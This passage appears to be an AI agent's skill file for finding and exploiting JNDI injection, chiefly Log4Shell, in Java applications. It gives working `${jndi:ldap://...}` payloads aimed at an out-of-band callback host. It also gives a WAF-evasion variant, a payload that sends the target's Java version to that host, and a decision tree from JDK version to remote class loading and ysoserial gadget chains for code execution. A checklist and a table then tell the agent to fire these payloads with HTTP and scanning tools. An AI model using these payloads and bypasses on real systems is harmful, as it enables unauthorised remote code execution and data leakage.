...
- [deserialization](../deserialization/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
- [expression-language](../expression-language/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation
...
| Signal | Probe | Why |
|---|---|---|
| Java app detected? | Check headers: X-Powered-By, Server, Set-Cookie JSESSIONID | Java stack confirms JNDI attack surface |
| Log4j2 in stack? | Send `${jndi:ldap://TOKEN.collab.net/a}` in User-Agent | Log4Shell — most common JNDI sink |
| DNS callback received? | Monitor Burp Collaborator / interactsh for DNS hit | Confirms JNDI evaluation without RCE |
| Different protocols work? | Try `rmi://`, `ldap://`, `dns://`, `iiop://` variants | RMI blocked at 8u121, LDAP at 8u191 — protocol matters |
| JDK version? | `${jndi:ldap://${sys:java.version}.TOKEN.collab.net}` | Determines exploit path (class loading vs deserialization) |

```bash
# Quick DNS-only probe — safe confirmation
# Inject into any user-controlled field:
${jndi:dns://YOUR_CALLBACK_TOKEN.collab.net}
# WAF blocking? try obfuscation:
${${lower:j}ndi:ldap://YOUR_CALLBACK_TOKEN.collab.net/x}
```
...
```
Java application with user-controlled input reaching lookup?
├── JNDI lookup reachable?
│   ├── Log4j2 detected → ${jndi:ldap://TOKEN.collab.net} probe
│   ├── Spring JndiTemplate → check lookup() calls
│   ├── Fastjson → @type + JdbcRowSetImpl
│   └── Custom InitialContext.lookup() → direct sink
├── JNDI evaluation confirmed (DNS hit)?
│   ├── Determine JDK version via ${sys:java.version}
│   └── Select exploit path by version
├── RMI vector?
│   ├── JDK < 8u121 → remote class loading via rmi://
│   └── JDK >= 8u121 → trustURLCodebase=false, RMI blocked
├── LDAP vector?
│   ├── JDK < 8u191 → remote class loading via ldap://
│   └── JDK >= 8u191 → try post-bypass paths
├── DNS vector?
│   └── Detection only → confirms injection without RCE
├── Post-8u191 bypass?
│   ├── LDAP → serialized gadget (CommonsCollections on classpath)
│   ├── BeanFactory + EL injection (Tomcat on classpath)
│   └── JRMPListener via ysoserial
└── Deserialization chain available?
    ├── CommonsCollections → ysoserial gadget chain → RCE
    └── No gadget chain → limited to DNS exfiltration
```
...
- [ ] Identify Java application and framework (Spring, Log4j2, Tomcat, WebLogic)
- [ ] Test Log4j2 lookup injection (`${jndi:ldap://...}`)
- [ ] Test JNDI lookup via RMI, LDAP, DNS, CORBA protocols
- [ ] Test JDK version constraints (pre-8u191 vs post)
- [ ] Test deserialization chains via JNDI (ysoserial gadgets)
- [ ] Test blind JNDI (DNS callback, time-based)
- [ ] Test input vectors: headers (User-Agent, Referer), path params, form fields
- [ ] Test WAF bypass (nested lookups, URL encoding, lower/upper lookup)
- [ ] Verify with out-of-band callback (Burp Collaborator, interactsh)

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Send crafted requests with JNDI lookup payloads in headers, body, and URL parameters |
| `http_repeater` | Replay and modify JNDI injection probes to test WAF bypass and obfuscation variants |
| `nuclei_scan` | Automated scanning for Log4Shell and other JNDI injection CVEs across injection points |
| `burpsuite_alternative_scan` | Comprehensive web scanning to identify Java middleware and JNDI-vulnerable surfaces |
